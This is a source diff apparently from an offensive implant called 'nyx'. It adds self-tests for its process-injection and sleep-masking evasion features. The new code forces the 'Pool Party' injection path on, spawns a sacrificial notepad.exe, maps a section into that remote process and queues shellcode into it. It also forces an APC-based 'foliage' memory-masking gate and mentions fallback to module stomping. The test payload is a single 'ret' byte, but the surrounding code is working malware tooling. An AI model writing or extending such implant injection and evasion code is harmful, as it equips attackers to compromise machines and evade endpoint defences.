@@ -520,6 +520,79 @@ pub unsafe extern "system" fn nyx_selftest_inject() {
     unsafe { exit(mask) };
 }
 
+// ============================================================================
+// nyx_selftest_inject_pool: exercise the P5 Pool Party path (Task section-backed
+// delivery). Forces POOL_PARTY_ENABLED on, creates a notepad sacrificial, and
+// calls do_inject(method=0) so the section create→map→write→TP_DIRECT path runs
+// against a real process. bit0 = section delivery path ran without panic,
+// bit1 = pool_party_inject returned Ok (full 0-of-3 FND), bit2 = degraded to
+// module_stomp (honest: section delivery OK but worker-queue splice needs more
+// target-side validation — see tp.rs TODO).
+// ⚠️ This opens a remote process + maps a section into it; a bug here may crash
+// the implant or the target (user-mode). Gate is forced ON for this selftest
+// regardless of NYX_POOL_PARTY_ON build-time default.
+// ============================================================================
+
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_inject_pool() {
+    let mut mask: u32 = 0;
+    // Force the gate ON for this selftest (restore on exit).
+    let prev_gate = crate::tp::set_pool_party_enabled(true);
+
+    // Create a notepad sacrificial to inject into (same path as method 2).
+    let proc = match crate::inject::create_sacrificial("notepad.exe") {
+        Ok(p) => p,
+        Err(_) => {
+            crate::tp::set_pool_party_enabled(prev_gate);
+            unsafe { exit(mask) };
+        }
+    };
+    mask |= 1 << 0; // create_sacrificial Ok (reached the inject path)
+
+    // Minimal shellcode: `ret` (0xC3). We're verifying the section delivery
+    // mechanism, not payload execution — a single-byte ret is the safest probe
+    // (no side effects, returns immediately if the splice fires).
+    let shellcode: [u8; 1] = [0xC3];
+
+    // do_inject(method=0, pid, spawn_to, shellcode) routes through the
+    // pool_party branch (gate ON) → tp::pool_party_inject.
+    let resp = crate::inject::do_inject(0, proc.pid, "notepad.exe", &shellcode);
+
+    // Decode the response. Response::Output carries a status line we can sniff.
+    match resp {
+        nyx_protocol::Response::Output(bytes) => {
+            // The pool_party_inject Ok path prefixes with "Pool Party inject ok".
+            // The degrade path prefixes with "WARN: Pool Party".
+            let text = core::str::from_utf8(&bytes).unwrap_or("");
+            if text.contains("Pool Party inject ok") {
+                mask |= 1 << 1; // full section delivery + splice succeeded
+            } else if text.contains("WARN: Pool Party") {
+                mask |= 1 << 2; // degraded to module_stomp (section delivery ran)
+            }
+        }
+        nyx_protocol::Response::Err(_) => {
+            // do_inject returned an error — section delivery itself failed.
+        }
+        _ => {}
+    }
+
+    // Cleanup: terminate the sacrificial notepad (whether or not inject landed).
+    if let Some(tp_addr) = crate::resolve::export_addr(b"kernel32.dll", b"TerminateProcess") {
+        type TerminateProcess = unsafe extern "system" fn(*mut core::ffi::c_void, u32) -> i32;
+        let terminate: TerminateProcess = unsafe { core::mem::transmute(tp_addr) };
+        let _ = unsafe { terminate(proc.handle, 1) };
+    }
+    if let Some(ch_addr) = crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") {
+        type CloseHandle = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
+        let close: CloseHandle = unsafe { core::mem::transmute(ch_addr) };
+        let _ = unsafe { close(proc.handle) };
+        let _ = unsafe { close(proc.main_thread) };
+    }
+
+    crate::tp::set_pool_party_enabled(prev_gate);
+    unsafe { exit(mask) };
+}
+
 /// Bits: 0=hostname-nonempty-nonhost, 1=username-nonempty-nonuser, 2=pid-nonzero.
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_hostinfo() {
@@ -2321,6 +2394,11 @@ pub unsafe extern "system" fn nyx_selftest_foliage() {
 pub unsafe extern "system" fn nyx_selftest_foliage_apc() {
     let mut mask: u32 = 0;
     crate::sleep::set_foliage_enabled(true);
+    // P4: force the APC gate ON for this selftest (otherwise it defaults OFF
+    // via NYX_FOLIAGE_APC_ON and execute_foliage_plan runs the data-only floor,
+    // never setting FOLIAGE_APC_OK=1). Restore on exit so the build-time
+    // default is respected outside this selftest.
+    let prev_apc = crate::sleep::set_foliage_apc_enabled(true);
     crate::sleep::sleep(2); // 2s window: helper masks .text, queues APC, unmasks
     mask |= 1 << 0; // reached the exit → no crash (image survived)
     let st = crate::sleep::foliage_apc_status();
@@ -2333,6 +2411,7 @@ pub unsafe extern "system" fn nyx_selftest_foliage_apc() {
     // Encode stage bitmask into upper byte: mask |= (stage as u32) << 8.
     // Bits 8-14 = FOLIAGE_STAGE bitmask (which stage got to before failure).
     mask |= (stage as u32) << 8;
+    crate::sleep::set_foliage_apc_enabled(prev_apc);
     crate::sleep::set_foliage_enabled(false);
     unsafe { exit(mask) };
 }
